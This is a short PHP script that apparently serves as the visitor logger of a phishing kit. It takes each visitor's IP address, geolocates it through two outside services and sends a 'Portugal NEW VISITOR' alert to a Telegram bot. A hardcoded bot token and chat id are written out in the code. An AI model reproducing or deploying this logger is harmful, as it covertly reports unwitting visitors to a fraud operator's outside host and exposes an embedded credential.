<?php  
    function getIPAddress() {  
    //whether ip is from the share internet  
     if(!empty($_SERVER['HTTP_CLIENT_IP'])) {  
                $ip = $_SERVER['HTTP_CLIENT_IP'];  
        }  
    //whether ip is from the proxy  
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {  
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];  
     }  
//whether ip is from the remote address  
    else{  
             $ip = $_SERVER['REMOTE_ADDR'];  
     }  
     return $ip;  
}  
$ip = getIPAddress();  
$iptolocation = 'http://api.hostip.info/country.php?ip=' . $ip;
$blad = file_get_contents($iptolocation);
$t=time();
$w9t = date("h:i:sa");
$ipdat = @json_decode(file_get_contents(
    "http://www.geoplugin.net/json.gp?ip=" . $ip));
$msg = "
----------- ♥◌⑅●♡⋆♡LOVE♡⋆♡●⑅◌♥----------------->
Portugal NEW VISITOR :  IP : $ip |
------------ ♥◌⑅●♡⋆♡LOVE♡⋆♡●⑅◌♥---------------->";

$token = "6399767470:AAEoAVprvbbAaTqzfHZaguiJzaAJArioSfY";
$data = [
    'text' => $msg,
    'chat_id' => '1259222990'
];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
?>